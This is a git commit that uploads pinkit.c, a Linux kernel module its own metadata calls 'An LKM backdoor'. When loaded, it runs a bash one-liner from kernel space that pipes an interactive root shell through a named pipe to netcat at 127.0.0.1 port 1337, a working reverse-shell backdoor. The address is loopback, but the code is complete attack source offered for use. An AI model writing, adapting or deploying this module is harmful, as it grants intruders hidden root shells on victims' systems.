e8e29f0dda0e8eca18d79094272dca67d9e6a602
PinkP4nther <36157015+PinkP4nther@users.noreply.github.com>
2018-05-15 05:13:53 +0000

    Add files via upload

---
+++ pinkit.c
@@ -0,0 +1,27 @@
+#include <linux/kmod.h>
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("@Pink_P4nther");
+MODULE_DESCRIPTION("An LKM backdoor");
+MODULE_VERSION("1.0");
+
+static int __init run(void)
+{
+	char *envp[] = {"HOME=/root","TERM=xterm",NULL};
+	char *argv[] = {"/bin/bash","-c","/usr/bin/rm /tmp/pinkit;/usr/bin/mkfifo /tmp/pinkit;/usr/bin/cat /tmp/pinkit|/bin/sh -i 2>&1|/usr/bin/nc 127.0.0.1 1337 >/tmp/pinkit",NULL};
+	printk(KERN_INFO "[+] Command Execution Begin\n");
+	call_usermodehelper(argv[0],argv,envp,UMH_WAIT_EXEC);
+	printk(KERN_INFO "[+] Command Execution End\n");
+	return 0;
+}
+
+static void __exit dun(void)
+{
+	printk(KERN_INFO "[+] MODULE INITIALIZED\n");
+}
+
+module_init(run);
+module_exit(dun);
